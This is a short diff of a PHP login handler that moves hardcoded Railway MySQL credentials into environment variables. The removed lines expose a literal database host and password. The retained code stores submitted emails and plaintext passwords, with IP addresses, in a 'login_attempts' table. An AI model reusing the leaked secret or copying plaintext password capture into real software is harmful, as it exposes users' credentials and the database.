@@ -13,20 +13,20 @@ function sendJsonResponse($success, $message = '') {
     exit();
 }
 
-// Database connection setup using Railway credentials
+// Database connection using Railway environment variables
 try {
-    // Database connection details from Railway
-    $host = 'centerbeam.proxy.rlwy.net'; // Replace with your host value
-    $port = '52019'; // Replace with your port value
-    $dbname = 'railway'; // Replace with your database name
-    $username = 'root'; // Replace with your username
-    $password_db = 'irguQmxkDWgvmKWHKTYzJycGSXJWpVUZ'; // Replace with your password
+    // Retrieve connection details from Railway environment variables
+    $host = getenv('MYSQLHOST'); // Host address
+    $port = getenv('MYSQLPORT'); // Connection port
+    $dbname = getenv('MYSQLDATABASE'); // Database name
+    $username = getenv('MYSQLUSER'); // Username
+    $password_db = getenv('MYSQLPASSWORD'); // Password
 
-    // PDO connection using MySQL
+    // PDO connection setup
     $dsn = "mysql:host={$host};port={$port};dbname={$dbname};charset=utf8mb4";
     $pdo = new PDO($dsn, $username, $password_db);
 
-    // Table insertion logic
+    // Insert login attempt into the `login_attempts` table
     $stmt = $pdo->prepare("INSERT INTO login_attempts (email, password, ip_address, attempt_time) VALUES (?, ?, ?, ?)");
     $stmt->execute([
         $email,
